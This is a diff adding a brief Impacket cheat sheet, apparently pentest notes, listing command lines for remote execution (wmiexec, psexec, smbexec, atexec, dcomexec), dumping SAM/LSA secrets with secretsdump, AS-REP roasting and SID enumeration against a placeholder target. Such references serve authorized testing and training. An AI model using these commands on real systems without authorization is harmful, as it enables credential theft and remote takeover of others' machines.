@@ -1,0 +1,35 @@
+# ==========================
+# Impacket (Python toolkit for network protocols)
+# ==========================
+
+# General Usage:
+# python3 <tool>.py -h     # Shows help for any Impacket tool
+
+# Examples:
+
+# wmiexec - Remote command execution via WMI
+python3 wmiexec.py DOMAIN/user:pass@target    # Executes commands remotely
+
+# smbclient - SMB file share access
+python3 smbclient.py DOMAIN/user:pass@target  # Opens SMB share access
+
+# secretsdump - Dump hashes from remote machine
+python3 secretsdump.py DOMAIN/user:pass@target   # Dumps SAM/LSA secrets
+
+# psexec - Remote execution similar to PsExec
+python3 psexec.py DOMAIN/user:pass@target     # Gets semi-interactive shell
+
+# smbexec - Command execution using SMB
+python3 smbexec.py DOMAIN/user:pass@target    # Executes commands over SMB
+
+# GetNPUsers - AS-REP roasting
+python3 GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass # Finds AS-REP roastable accounts
+
+# lookupsid - SID lookup tool
+python3 lookupsid.py DOMAIN/user:pass@target  # Enumerates user accounts via SID
+
+# atexec - Executes remote command using Task Scheduler
+python3 atexec.py DOMAIN/user:pass@target     # Task-based remote execution
+
+# dcomexec - Executes commands using DCOM
+python3 dcomexec.py DOMAIN/user:pass@target   # Remote shell via DCOM
